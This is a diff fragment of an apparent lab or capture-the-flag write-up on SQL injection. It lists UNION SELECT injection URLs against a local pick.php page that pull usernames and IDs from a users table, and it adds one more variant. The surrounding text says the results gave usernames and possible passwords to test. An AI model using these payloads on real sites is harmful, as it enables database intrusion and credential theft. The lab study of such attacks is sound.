@@ -149,6 +149,8 @@ ________________________________________________________________________________
     http://127.0.0.1:20002/pick.php?product=7 UNION SELECT user_id,3,name FROM siteusers.users
     http://127.0.0.1:20002/pick.php?product=7 UNION SELECT username,3,2 FROM siteusers.users
 All possible combo's the last one is the most promising ;)
+
+    http://127.0.0.1:20002/pick.php?product=7 UNION SELECT username,3,user_id FROM siteusers.users
 ______________________________________________________________________________________________________________
 ## From the last golden statement we tried we got usernames and possible passwords
 ### Placing them below to test which ones work
